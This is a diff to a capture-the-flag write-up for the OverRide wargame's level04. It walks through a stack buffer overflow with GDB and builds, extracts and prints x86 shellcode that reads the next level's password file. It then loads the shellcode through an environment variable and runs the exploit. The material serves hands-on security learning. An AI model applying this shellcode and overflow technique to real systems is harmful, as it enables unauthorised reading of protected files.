@@ -87,6 +87,8 @@ So, we want to craft a payload that opens `/homes/level05/.pass`, reads its cont
 
 First, we want to make the program segfault. More precisely, it's the child that's going to segfault, not the entire program, since its the one making the `gets()` call.
 To do that, we are going to make use of GDB, and tell it to track the child and not the parent process.
+
+To trace the child process: `set follow-fork-mode child`
 ```
 level04@OverRide:~$ gdb level04
 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
@@ -98,7 +100,7 @@ Breakpoint 2 at 0x80484b0
 (gdb) b *0x08048763
 Breakpoint 3 at 0x8048763
 ```
-We break at main, the `gets()` call and the address just after the `gets()` call (see `desass main`)
+We break at main, the `gets()` call and the address just after the `gets()` call (see `disass main`)
 We ran the program, and fill `gets()` with:
 ```
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
@@ -151,3 +153,46 @@ Second, we can get the address of the buffer by showing the content of the stack
 
 Third, let's craft the payload, in ASM, then compile it and make a Python function to print it.
 For the ASM shellcode, see `Resources/shellcode.s`, for the Python function, see `Resources/script.py`.
+
+Because I work on Mac, I had to setup a quick Debian docker to compile the code.
+
+We compile the shellcode:
+```bash
+nasm -f elf32 shellcode.asm -o shellcode.o
+ld -m elf_i386 -o shellcode shellcode.o
+```
+
+Then, extract the shellcode from the binary:
+```bash
+objdump -d -M intel shellcode | grep -Po '\s\K[0-9a-f]{2}(?=\s)' | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
+\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x73\x68\x2e\x70\x61\x73\x68\x30\x35\x2f\x2f\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x05\x89\xe3\xb1\x02\xb2\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe1\xb2\x29\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x29\xcd\x80\xb0\x01\xcd\x80
+```
+Because it's super lenghty, we need to write it first inside of an environment variable, and then tell our program to look for the data in there.
+
+Also, you need to make sure that the string of our shellcode doesn't contain any null bytes (`\x00`), or that would be a huge problem when copying strings.
+
+Then, we craft an output, where we will fill the buffer and write the environment variable address, that you can get using a simple C code:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+	printf("%p\n", getenv("SHELLCODE"));
+	return 0;
+}
+```
+Using `env -i`, you can see where the shellcode will be stored in the environment:
+```
+level04@OverRide:~$ env -i SHELLCODE=$(python ~/pyshell.py) /tmp/main
+0xffffdf8a
+```
+Also, make sure that the name of the executable, `/tmp/main`, is as long as the name of the executable you want to exploit: `./level04`.
+
+Then, we write that address into the Python script to craft a malicious input, and we are good to go!
+
+```
+level04@OverRide:~$ cat input | env -i SHELLCODE=$(python ~/pyshell.py) ./level04
+Give me some shellcode, k
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+child is exiting...
+```
